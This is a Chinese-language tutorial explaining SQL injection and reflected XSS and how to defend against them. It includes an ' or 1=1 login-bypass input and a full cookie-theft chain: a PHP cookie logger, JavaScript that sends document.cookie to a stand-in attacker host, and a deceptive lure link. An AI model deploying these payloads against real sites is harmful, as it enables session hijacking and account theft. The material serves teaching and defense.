# 常见web漏洞（Sql注入、XSS、CSRF）原理以及攻防总结
## Sql注入
所谓SQL注入式攻击，就是攻击者把SQL命令插入到Web表单的输入域或页面请求的查询字符串，欺骗服务器执行恶意的SQL命令。 攻击者通过在应用程序预先定义好的SQL语句结尾加上额外的SQL语句元素，欺骗数据库服务器执行非授权的查询,篡改命令。<br/>
**攻击原理**
``` python
假设的登录查询
SELECT * FROM  users  WHERE login = 'victor' AND password = '123
Sever端代码
String sql = "SELECT * FROM users WHERE login = '" + formusr + "' AND password = '" + formpwd + "'";
输入字符
formusr = ' or 1=1
formpwd = anything
实际的查询代码
SELECT * FROM users WHERE username = ' ' or 1=1  AND password = 'anything' 
```
**如何防范**<br/>
 - 服务端特殊字符过滤: <、>、* 、& 等
 - 使用ORM框架
 - 参数化Sql查询语句
## Xss攻击
 XSS 全称(Cross Site Scripting) 跨站脚本攻击， 是Web程序中最常见的漏洞。指攻击者在网页中嵌入客户端脚本(例如JavaScript), 当用户浏览此网页时，脚本就会在用户的浏览器上执行，从而达到攻击者的目的.  比如获取用户的Cookie，导航到恶意网站,携带木马等。<br/>
 **分类： 反射型和持久型**<br/>
### 反射型
这种攻击不经过数据库，是从目标服务器通过错误信息、搜索结果等等方式“反射”回来的，攻击者通过电子邮件等方式将包含注入脚本的恶意链接发送给受害者，当受害者点击该链接时，注入脚本被传输到目标服务器上，然后服务器将注入脚本“反射”到受害者的浏览器上，从而在该浏览器上执行了这段脚本。<br/>
**这种漏洞主要存在于与用户有交互的地方，如搜索框，如果后台没有对搜索的内容进行过滤，而原封不动的将搜索内容展示在dom中，则存在Xss漏洞**<br/>
**详细攻击方式如下：**
 - 构建自己的黑客网站 如： hacker.qq.com
 - 该域名下有一 hack.php:
 ``` php
<?php 
$cookie = $_GET['q']; 
var_dump($cookie); 
$myFile = "cookie.txt"; 
file_put_contents($myFile, $cookie); 
?>
```
- 另外一 hack.js
``` js
var img = new Image();
img.src = "http://hacker.qq.com/hack.php?q="+document.cookie;
document.body.append(img);
```
- 构造一个连接来欺骗用户
``` html
<a href="http://xsstest.qq.com/search.php?q=%3Cscript+
src%3Dhttp%3A%2F%2Fhacker.qq.com%2Fhacker.js%3E%3C%2Fscript%3E&commend=
all&ssid=s5-e&search_type=item&atype=&filterFineness=&rr=
1&pcat=food2011&style=grid&cat=">点击就送998</a>
```
假设``` http://xsstest.qq.com ```就是存在xss漏洞的网站，search.php后的q参数 ,解码后为<br/>
``` <script src="http://hacker.qq.com/hacker.js"></script>``` <br/>
实际的作用是模拟用户在搜索框中输入<br/>
``` <script src="http://hacker.qq.com/hacker.js"></script> ```<br/>
后点击搜索。search.php未经处理的将其直接输入到页面， 黑客就可以获取用户在xsstest.qq.com网站的cookie。
